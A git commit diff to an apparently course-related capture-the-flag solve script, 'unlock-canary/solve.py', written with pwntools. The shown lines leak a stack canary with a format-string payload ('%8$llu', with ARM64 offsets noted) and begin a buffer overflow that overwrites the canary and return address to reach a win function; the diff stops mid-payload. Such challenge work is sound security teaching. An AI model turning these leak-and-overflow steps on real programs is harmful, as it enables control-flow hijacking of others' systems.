fe3d52b3cc9e997add303bb24a0fcba0f6ad06a3
ccat-cmu <jouyin@Jou-Yins-MacBook-Pro.local>
2025-11-10 16:41:36 -0500

    Add payload for both architecture

--- challenges/unlock-canary/solve.py
+++ challenges/unlock-canary/solve.py
@@ -5,17 +5,18 @@
 from pwn import *
 
 host = "127.0.0.1"              # change to the actual server hostname
-port = "51518"                  # change to the updated port
+port = "61931"                  # change to the updated port
 
 conn = remote(host, port)
 
 BUFFER_LEN = 8
 PADDING_LEN = 0                 # 6 bytes padding for ARM64 tho
 WIN_ADDR = 0x401423             # address to win function by objdump
+#WIN_ADDR = 0x400b38            # for ARM64
 
 print(conn.recvuntil("\nEnter your message:\n"))
 
-# Step 1 Leak canary
+# Step 1 Leak Canary
 payload = b"%8$llu"             # local canary stored at the 8th argument on AMD64
                                 # 4 registers than stack
 # payload = b"%12$llu"          # local canary stored at the 12th argument on ARM64
@@ -27,7 +28,7 @@ canary = conn.recvuntil("\n")
 canary = int(canary.rstrip(b'\r\n'))
 print("Canary: " + str(canary))
 
-# Step 2 
+# Step 2 Control Flow Hijack
 # * Overwrite i and run to finish while loop;
 # * Overwrite canary and return address with address to win
 payload = b"A" * BUFFER_LEN
